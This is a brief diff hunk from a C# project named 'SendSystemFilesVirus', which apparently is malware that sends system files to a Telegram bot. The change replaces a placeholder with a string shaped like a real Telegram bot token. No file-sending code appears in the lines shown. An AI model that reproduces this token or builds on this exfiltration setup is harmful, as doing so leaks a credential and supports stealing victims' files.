@@ -6,7 +6,7 @@ namespace SendSystemFilesVirus
     {
 
         private readonly ILogger<Worker> _logger;
-        public static readonly TelegramBotClient _telegramBotClient = new("bot_token");
+        public static readonly TelegramBotClient _telegramBotClient = new("6171289441:AAGZdM0PVm7JyUdibDyjz2CWj91h72b04iA");
 
         public Worker(ILogger<Worker> logger)
         {
